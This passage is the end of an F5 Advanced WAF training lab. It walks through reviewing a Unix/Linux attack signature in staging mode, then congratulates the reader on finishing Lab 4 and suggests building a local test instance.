3. Click the little blue i and review the Attack Signature Details. We can see that this was a Systems based Unix/Linux Signature in staging mode.
![image](https://user-images.githubusercontent.com/38420010/119372077-3fc76000-bcb7-11eb-8838-a2d9f448fb81.png)

4. We are now alerting on attacks aimed at Server Technologies.

**This completes Lab 4**

**Congratulations! It was a long road but you made it though and now have the knowledge to go forth and start testing. Given the Advanced WAF is a proxy, you could build a Virtual Edition F5 locally on your machine and implement a number of test scenarios with no impacts to a production application. Contact your friendly neighborhood F5 Solutions Engineer for more information!! Hope to see you in the 241 Elevated WAF Protection class! Cheers!!!**






































































